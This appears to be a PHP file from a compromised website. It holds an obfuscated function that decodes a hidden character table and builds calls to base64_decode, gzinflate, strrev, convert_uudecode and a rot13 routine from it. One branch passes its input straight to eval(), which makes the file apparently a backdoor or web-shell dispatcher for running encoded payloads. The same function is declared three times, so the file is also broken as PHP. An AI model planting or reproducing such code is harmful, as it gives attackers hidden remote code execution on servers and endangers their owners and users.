<?php function aX0grtyu456RtO8($a, $b) {
    $z2342345gk7456 = str_rot13(gzinflate(str_rot13(base64_decode("MzQyNjE1M7ewNMjLLygsKi4pLSuvqKxXWVdBVlpYz8jMys7JjQcA"))));
    if ($a == "srwertxcbtytyu//..huytytryurt") {
        $qwery45234dws = $z2342345gk7456{28} . $z2342345gk7456{29} . $z2342345gk7456{27} . $z2342345gk7456{27} . $z2342345gk7456{14} . $z2342345gk7456{31};
        return $qwery45234dws($b);
    } else if ($a == "cftrt546576fgh//huuiy..\/ghhj") {
        $owe342wfbjdewqre34 = $z2342345gk7456{12} . $z2342345gk7456{24} . $z2342345gk7456{23} . $z2342345gk7456{31} . $z2342345gk7456{14} . $z2342345gk7456{27} . $z2342345gk7456{29} . $z2342345gk7456{36} . $z2342345gk7456{30} . $z2342345gk7456{30} . $z2342345gk7456{13} . $z2342345gk7456{14} . $z2342345gk7456{12} . $z2342345gk7456{24} . $z2342345gk7456{13} . $z2342345gk7456{14};
        return $owe342wfbjdewqre34($b);
    } else if ($a == "azsewqwqwez/...derwewr") {
        $rt4534fhghj5 = $z2342345gk7456{28} . $z2342345gk7456{29} . $z2342345gk7456{27} . $z2342345gk7456{36} . $z2342345gk7456{27} . $z2342345gk7456{24} . $z2342345gk7456{29} . $z2342345gk7456{0} . $z2342345gk7456{2};
        return $rt4534fhghj5($b);
    } else if ($a == "ax6789f/////....sfcxfcfge4653dhg") {
        $as346hgjkhfg = $z2342345gk7456{11} . $z2342345gk7456{10} . $z2342345gk7456{28} . $z2342345gk7456{14} . $z2342345gk7456{5} . $z2342345gk7456{3} . $z2342345gk7456{36} . $z2342345gk7456{13} . $z2342345gk7456{14} . $z2342345gk7456{12} . $z2342345gk7456{24} . $z2342345gk7456{13} . $z2342345gk7456{14};
        return $as346hgjkhfg($b);
    } else if ($a == "zs3454sdfcvnyrertc_gygu") {
        $zsweqwq4546dgh = $z2342345gk7456{16} . $z2342345gk7456{35} . $z2342345gk7456{18} . $z2342345gk7456{23} . $z2342345gk7456{15} . $z2342345gk7456{21} . $z2342345gk7456{10} . $z2342345gk7456{29} . $z2342345gk7456{14};
        return $zsweqwq4546dgh($b);
    } else if ($a == "ax4564365dgvbmnmhu56fgvgvc//gygyugu") {
        return eval($b);
    }
}
function aX0grtyu456RtO8($a, $b) {
    $z2342345gk7456 = str_rot13(gzinflate(str_rot13(base64_decode("MzQyNjE1M7ewNMjLLygsKi4pLSuvqKxXWVdBVlpYz8jMys7JjQcA"))));
    if ($a == "srwertxcbtytyu//..huytytryurt") {
        $qwery45234dws = $z2342345gk7456{28} . $z2342345gk7456{29} . $z2342345gk7456{27} . $z2342345gk7456{27} . $z2342345gk7456{14} . $z2342345gk7456{31};
        return $qwery45234dws($b);
    } else if ($a == "cftrt546576fgh//huuiy..\/ghhj") {
        $owe342wfbjdewqre34 = $z2342345gk7456{12} . $z2342345gk7456{24} . $z2342345gk7456{23} . $z2342345gk7456{31} . $z2342345gk7456{14} . $z2342345gk7456{27} . $z2342345gk7456{29} . $z2342345gk7456{36} . $z2342345gk7456{30} . $z2342345gk7456{30} . $z2342345gk7456{13} . $z2342345gk7456{14} . $z2342345gk7456{12} . $z2342345gk7456{24} . $z2342345gk7456{13} . $z2342345gk7456{14};
        return $owe342wfbjdewqre34($b);
    } else if ($a == "azsewqwqwez/...derwewr") {
        $rt4534fhghj5 = $z2342345gk7456{28} . $z2342345gk7456{29} . $z2342345gk7456{27} . $z2342345gk7456{36} . $z2342345gk7456{27} . $z2342345gk7456{24} . $z2342345gk7456{29} . $z2342345gk7456{0} . $z2342345gk7456{2};
        return $rt4534fhghj5($b);
    } else if ($a == "ax6789f/////....sfcxfcfge4653dhg") {
        $as346hgjkhfg = $z2342345gk7456{11} . $z2342345gk7456{10} . $z2342345gk7456{28} . $z2342345gk7456{14} . $z2342345gk7456{5} . $z2342345gk7456{3} . $z2342345gk7456{36} . $z2342345gk7456{13} . $z2342345gk7456{14} . $z2342345gk7456{12} . $z2342345gk7456{24} . $z2342345gk7456{13} . $z2342345gk7456{14};
        return $as346hgjkhfg($b);
    } else if ($a == "zs3454sdfcvnyrertc_gygu") {
        $zsweqwq4546dgh = $z2342345gk7456{16} . $z2342345gk7456{35} . $z2342345gk7456{18} . $z2342345gk7456{23} . $z2342345gk7456{15} . $z2342345gk7456{21} . $z2342345gk7456{10} . $z2342345gk7456{29} . $z2342345gk7456{14};
        return $zsweqwq4546dgh($b);
    } else if ($a == "ax4564365dgvbmnmhu56fgvgvc//gygyugu") {
        return eval($b);
    }
}
function aX0grtyu456RtO8($a, $b) {
    $z2342345gk7456 = str_rot13(gzinflate(str_rot13(base64_decode("MzQyNjE1M7ewNMjLLygsKi4pLSuvqKxXWVdBVlpYz8jMys7JjQcA"))));
    if ($a == "srwertxcbtytyu//..huytytryurt") {
        $qwery45234dws = $z2342345gk7456{28} . $z2342345gk7456{29} . $z2342345gk7456{27} . $z2342345gk7456{27} . $z2342345gk7456{14} . $z2342345gk7456{31};
        return $qwery45234dws($b);
    } else if ($a == "cftrt546576fgh//huuiy..\/ghhj") {
        $owe342wfbjdewqre34 = $z2342345gk7456{12} . $z2342345gk7456{24} . $z2342345gk7456{23} . $z2342345gk7456{31} . $z2342345gk7456{14} . $z2342345gk7456{27} . $z2342345gk7456{29} . $z2342345gk7456{36} . $z2342345gk7456{30} . $z2342345gk7456{30} . $z2342345gk7456{13} . $z2342345gk7456{14} . $z2342345gk7456{12} . $z2342345gk7456{24} . $z2342345gk7456{13} . $z2342345gk7456{14};
        return $owe342wfbjdewqre34($b);
    } else if ($a == "azsewqwqwez/...derwewr") {
        $rt4534fhghj5 = $z2342345gk7456{28} . $z2342345gk7456{29} . $z2342345gk7456{27} . $z2342345gk7456{36} . $z2342345gk7456{27} . $z2342345gk7456{24} . $z2342345gk7456{29} . $z2342345gk7456{0} . $z2342345gk7456{2};
        return $rt4534fhghj5($b);
    } else if ($a == "ax6789f/////....sfcxfcfge4653dhg") {
        $as346hgjkhfg = $z2342345gk7456{11} . $z2342345gk7456{10} . $z2342345gk7456{28} . $z2342345gk7456{14} . $z2342345gk7456{5} . $z2342345gk7456{3} . $z2342345gk7456{36} . $z2342345gk7456{13} . $z2342345gk7456{14} . $z2342345gk7456{12} . $z2342345gk7456{24} . $z2342345gk7456{13} . $z2342345gk7456{14};
        return $as346hgjkhfg($b);
    } else if ($a == "zs3454sdfcvnyrertc_gygu") {
        $zsweqwq4546dgh = $z2342345gk7456{16} . $z2342345gk7456{35} . $z2342345gk7456{18} . $z2342345gk7456{23} . $z2342345gk7456{15} . $z2342345gk7456{21} . $z2342345gk7456{10} . $z2342345gk7456{29} . $z2342345gk7456{14};
        return $zsweqwq4546dgh($b);
    } else if ($a == "ax4564365dgvbmnmhu56fgvgvc//gygyugu") {
        return eval($b);
    }
};
$zxAwx0XtrY0189j0KKxaz0 = "aX0grtyu456RtO8";
?>